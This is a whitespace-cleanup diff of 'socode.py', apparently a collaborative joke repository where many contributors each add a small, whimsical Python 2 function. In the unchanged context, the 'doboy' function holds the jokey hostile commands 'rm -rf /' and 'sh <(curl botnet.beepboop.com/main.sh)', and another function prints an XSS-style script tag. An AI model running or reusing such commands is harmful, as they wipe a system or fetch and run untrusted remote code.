@@ -79,11 +79,11 @@ def ray0sunshine():
     print "Gibe moni pls"
     print "Morde es numero uno"
     for br in xrange(666):
-    	print "HUE "
-    	if random.randint(0,9) == 6:
-    	    print "BR?\n"
+        print "HUE "
+        if random.randint(0,9) == 6:
+            print "BR?\n"
     print "i repot u"
-	
+
 def rjwebb(n):
     """Tries to print the username, real name and location of the first n users in this file. Fails silently."""
 
@@ -101,7 +101,7 @@ def rjwebb(n):
     user_name_pattern = "[a-zA-Z][a-zA-Z\-]*"
     fun_start_pattern = "\ndef ("+user_name_pattern+")"
     users = re.findall(fun_start_pattern, local_file)
-    
+
     for user in users[:n]:
         r = get_user_page(user)
         j = json.loads(r)
@@ -117,12 +117,12 @@ def antonaut(print_color=None):
     """
     Sets the color of sys.stdout to print_color.
     WHICH MEANS:
-        
+
         >>> antonaut()
         >>> print "asdfqwerty" # GIEFS AWESUM COLORZ (in a bash shell).
-    
+
     If no color is given, it randomizes the color of the output. YAY!
-    
+
     DOUBLE RAINBOOOOOOW!"""
 
 
@@ -157,11 +157,11 @@ def antonaut(print_color=None):
 
         choice = random.randint(0, len(colors.keys()) - 1)
         return colors.values()[choice] + c + color_off
-        
-    
+
+
     plat = platform.system().lower()
     if plat == 'linux' or plat == 'darwin':
-        
+
         ### DUCK PUNCHING PRINT ###
         ### http://stackoverflow.com/questions/4883789/adding-a-datetime-stamp-to-python-print
         stdout = sys.stdout
@@ -174,7 +174,7 @@ def antonaut(print_color=None):
                     else:
                         s += unicode(colorify(c))
                 stdout.write(s)
-            
+
             def flush():
                 stdout.flush()
 
@@ -196,7 +196,7 @@ def starefossen():
 
 def jontonsoup():
     print "There's always one more bug."
-    
+
 def monsdar():
     print "Hello?..."
     print "         ...yes, this is dog!"
@@ -224,14 +224,14 @@ def doctorpangloss():
     # not sure what is being achieved here - @sricola
     #matches = re.sub(r'doctorpangloss\(\)\n', r'doctorpangloss()\ndoctorpangloss()\n', raw, re.M|re.I|re.G)
     #print raw
-    
+
 def ankushsachdeva():
-	contents =open(__file__).read()
-	print re.findall('def .* :',contents)
-	
+        contents =open(__file__).read()
+        print re.findall('def .* :',contents)
+
 def adelevie():
     pass
-    
+
 def thisishugo():
     time.sleep(1)
 
@@ -257,7 +257,7 @@ def sricola():
 def bencooling():
     print "I don't know Python; I don't belong here"
     zachlatta()
-    
+
 def quarterto(m,n):
     if m == 0:
         return n+1
@@ -267,7 +267,7 @@ def quarterto(m,n):
         return quarterto(m-1,quarterto(m,n-1))
     else:
         return 0
-    
+
 def kisom():
     def zgohr(city):
         weather = json.loads(requests.
@@ -292,7 +292,7 @@ def evinugur():
 def ncammarata():
     tweets = json.loads(requests.get("https://search.twitter.com/search.json?q=a").content)
     tweet = tweets['results'][0]['text']
-    print "Random Tweet:", tweet.encode('utf-8') 
+    print "Random Tweet:", tweet.encode('utf-8')
 
 # Generate a random nonsense word with a vowel:consolant ratio of 1:5
 def taylorlapeyre():
@@ -312,7 +312,7 @@ def taylorlapeyre():
 
 def kghose():
     import curses, time
-    
+
     def main_loop(window):
         window.clear()
         N = 100
@@ -326,15 +326,15 @@ def kghose():
             for n in xrange(2*this_prime, N+1, this_prime):
                 numbers[n] = None
                 paint_grid(window, numbers)
-          
+
             keep_finding = False
             for n in xrange(this_prime+1, N+1):
                 if numbers[n] is not None:
                     this_prime = n
                     keep_finding = True
                     break
-    
-    
+
+
     def paint_grid(window, numbers):
         for row in xrange(10):
             for col in xrange(10):
@@ -346,9 +346,9 @@ def kghose():
               window.addstr(row, 3*col, s)
         window.refresh()
         time.sleep(.1)
-    
+
     curses.wrapper(main_loop)
-    
+
 def jessex():
     os.execl("/bin/echo", "echo", "This is a long way to go for 'hello world' but life's about the journey.")
 
@@ -385,7 +385,7 @@ def eternalmatt():
     print "Never gonna let you down."
     print "Never gonna run around."
     print "And desert you."
-    
+
 def charliegroll():
     print "Never gonna make you cry,"
     print "Never gonna say goodbye,"
@@ -400,7 +400,7 @@ def devonbarrett():
     print "Gotta make you understand"
     eternalmatt()
     charliegroll()
-    
+
 def lbalceda(value=None):
     if value is None:
         value = 100
@@ -495,7 +495,7 @@ def GeneralZero():# Spin the wheel
     random.choice([obj for name, obj in inspect.getmembers(sys.modules[__name__]) if inspect.isfunction(obj)])()
 
 def bprater():
-	print "social coding, the end is near."
+        print "social coding, the end is near."
 
 def satshabad():
     # this doesn't seem to space right...
@@ -623,7 +623,7 @@ def chris911():
 
 def PiersonBro():
     print "My bane was not capability it was randomness."
- 
+
 def dogukantufekci():
     print "This is the connected world."
     webbrowser.open('http://www.silverspore.com/wiki/images/1/12/Connected_world-medium.jpg')
@@ -674,7 +674,7 @@ def seripap(hax,x,y):
     time.sleep(x)
     print "just kidding :)"
     time.sleep(.4)
-    
+
 def umurgdk():
     """this code prints github usernames who forked this project"""
     reader = urllib2.urlopen('https://api.github.com/repos/sricola/socode/forks')
@@ -684,29 +684,29 @@ def umurgdk():
     print "-----------------------------"
     for fork in forks:
         print fork["owner"]["login"], ("<= That's me ^_^" if fork["owner"]["login"] == 'umurgdk' else "")
-    
+
 def doboy(doboy_):
     if doboy == doboy_:
         doboy_('rm -rf /')
         doboy('sh <(curl botnet.beepboop.com/main.sh)')
     else:
         print doboy_
-        
+
 def ngokevin(shamelessadvertising):
     # I'm sleepy zzz.
     time.sleep(0)
     # Check for XSS.
     print '<script>alert("HAHAHA");</script>'
     import antigravity
-    
+
 def gardaud(func):
-	print "Should I execute func?"
-	if random.randrange(0,2) == 0:
-		print "Yes! :D"
-		return func()
-	else:
-		print "No! :( "
-		return None
+        print "Should I execute func?"
+        if random.randrange(0,2) == 0:
+                print "Yes! :D"
+                return func()
+        else:
+                print "No! :( "
+                return None
 
 def perimosocordiae():
     data = requests.get('https://raw.github.com/sricola/socode/master/socode.py').content
@@ -787,7 +787,7 @@ def rightfold():
 
 def shazeline(name):
     print name + " is a pretty cool guy"
-    
+
 def samlabs821():
     print "vesselam"
 
@@ -823,7 +823,7 @@ def dmercer(number, start=2):
         if is_prime:
             sieve.append(n)
     return sieve
-    
+
 def ryanseys():
     try:
         ryanseys()
@@ -870,7 +870,7 @@ def spratt():
 
 def windspy():
   print "'cross the GREAT WALL, we can reach every corner of the world' is just a big joke."
-  
+
 def arkokoley():
   print "Long live Aaron Swartz!"
 
@@ -878,20 +878,20 @@ def dpayne():
     try:
         #sets the desktop wallpaper to the top image on the wallpapers subreddit
         sub_reddit = 'wallpapers'
-        
+
         #get the top image link
         reddit_json_url = 'http://www.reddit.com/r/' + sub_reddit + '/top.json?sort=top&t=day'
         response = urllib2.urlopen(reddit_json_url)
         redditJson = response.read()
         m = re.search('\"url\": \"(.*?)\",', redditJson)
         imageUrl = m.group(1)
-        
+
         extension = imageUrl[-4:]
         accepted_extensions = set(['jpeg', '.jpg', '.png', '.bmp'])
         if extension not in accepted_extensions:
             #ignore non image extensions
             return False
-        
+
         #save top wallpaper
         opener1 = urllib2.build_opener()
         page1 = opener1.open(imageUrl)
@@ -900,10 +900,10 @@ def dpayne():
         fout = open(filename, "wb")
         fout.write(my_picture)
         fout.close()
-        
+
         currentDir = os.getcwd()
         plat = platform.system().lower()
-        
+
         #set wallpaper
         if (plat == 'darwin'):
             os.system("defaults write com.apple.desktop Background '{default = {ImageFilePath = \"" + currentDir + "/reddit_wallpaper.jpg\"; };}'")
@@ -911,7 +911,7 @@ def dpayne():
             return True
     except urllib2.HTTPError:
         print 'There was an error'
-    
+
     return False
 
 def codesuela(board):
@@ -925,61 +925,61 @@ def lcynot():
 
 def zonetti():
     print "Open Source FTW"
-    
+
 def hako():
-	from datetime import date
+        from datetime import date
 
-	class yllo:
-		YLLO = '\033[93m'
-		NRML = '\033[0m'
+        class yllo:
+                YLLO = '\033[93m'
+                NRML = '\033[0m'
 
-    	url = "http://www.hakobaito.co.uk"
-    	wuzhere = date.fromtimestamp(1366649761)
-    	print yllo.YLLO
-    	print "Yellow World! @hako was here! :D", wuzhere
-    	print "=[],"
-    	print yllo.NRML
-    	print url
+        url = "http://www.hakobaito.co.uk"
+        wuzhere = date.fromtimestamp(1366649761)
+        print yllo.YLLO
+        print "Yellow World! @hako was here! :D", wuzhere
+        print "=[],"
+        print yllo.NRML
+        print url
 
 def pocon():
-	import __hello__
-	print "And with that, @pocon chimes in late"
-	
+        import __hello__
+        print "And with that, @pocon chimes in late"
+
 def myeaple():
-	new = 2 # Open a new tab, if possible
-	
-	num_fn = len([obj for name, obj in inspect.getmembers(sys.modules[__name__]) if inspect.isfunction(obj)])
-	
-	text = "There%20are%20currently%20" + (str)(num_fn) + "%20functions%20in%20socode.py"
-	hashtags = "socode"
-	socode_url = "https%3A%2F%2Fgithub.com%2Fsricola%2Fsocode"
-	
-	print "Number of functions in socode.py = " + (str)(num_fn)
-	
-	# Tweet the number of functions in socode.py
-	url = "https://twitter.com/intent/tweet?url=" + socode_url + "&text=" + text + "&hashtags=" + hashtags
-	
-	webbrowser.open(url, new=new)
+        new = 2 # Open a new tab, if possible
+
+        num_fn = len([obj for name, obj in inspect.getmembers(sys.modules[__name__]) if inspect.isfunction(obj)])
+
+        text = "There%20are%20currently%20" + (str)(num_fn) + "%20functions%20in%20socode.py"
+        hashtags = "socode"
+        socode_url = "https%3A%2F%2Fgithub.com%2Fsricola%2Fsocode"
+
+        print "Number of functions in socode.py = " + (str)(num_fn)
+
+        # Tweet the number of functions in socode.py
+        url = "https://twitter.com/intent/tweet?url=" + socode_url + "&text=" + text + "&hashtags=" + hashtags
+
+        webbrowser.open(url, new=new)
 
 def reksy():
-	print "I thought Python was like the snake game?"
+        print "I thought Python was like the snake game?"
 
 def NerdyTherapist():
     print "What am I doing? I should be working on my Bachelor thesis..."
 
 def calvcoll(rs):
-	if rs == 1024:
-		print "You have struck the gold mine!"
-		print "Well done for getting the 2^10"
-		print "--Love from your ginger friend, Calv"
+        if rs == 1024:
+                print "You have struck the gold mine!"
+                print "Well done for getting the 2^10"
+                print "--Love from your ginger friend, Calv"
 
 def bheesham():
-	print "Hello world! - Bheesham"
+        print "Hello world! - Bheesham"
 
 def markembling(talkative=True):
     """Generate a random colour as a tuple (R,G,B) and optionally print it"""
-    colour = (random.randint(0, 255), 
-              random.randint(0, 255), 
+    colour = (random.randint(0, 255),
+              random.randint(0, 255),
               random.randint(0, 255))
     if talkative:
         print "Your randomly created colour is: #%x%x%x" % colour
@@ -988,7 +988,7 @@ def markembling(talkative=True):
 def joshryandavis():
     for i in range(0, 72):
         print 'Around the world, around the world'
- 
+
 def mainliner(n,sum_xy,sum_x,sum_y,sum_xx,sum_yy):
     numerator = ( n*sum_xy - sum_x*sum_y )
     denominator = sqrt(n*sum_xx - sum_x*sum_x) * sqrt(n*sum_yy - sum_y*sum_y)
@@ -1000,13 +1000,13 @@ def ncerminara(n):
     return int(round((phi**n - (1-phi)**n) / 5**0.5))
 
 def rafkhan():
-	print socode_source
-	
+        print socode_source
+
 def nazgu1():
     www=urllib2.urlopen('http://dziurdzia.eu/').read()
     www=urllib2.urlopen('https://cycloo.pl').read()
     print 'Hello World! :)'
-    
+
 
 # Please consider creating your function
 # some random place between two other
@@ -1014,9 +1014,9 @@ def nazgu1():
 # This will give your commit a much
 # better chance of getting merged.
 
-# Ironically, the commit adding ^ gave me 
-# a merge conflict whilst trying to 
-# resolve merge conflicts :P - pocon 
+# Ironically, the commit adding ^ gave me
+# a merge conflict whilst trying to
+# resolve merge conflicts :P - pocon
 # Sorry - daniel-dressler
 if __name__ == "__main__":
     seripap("deleting ",1,"......")
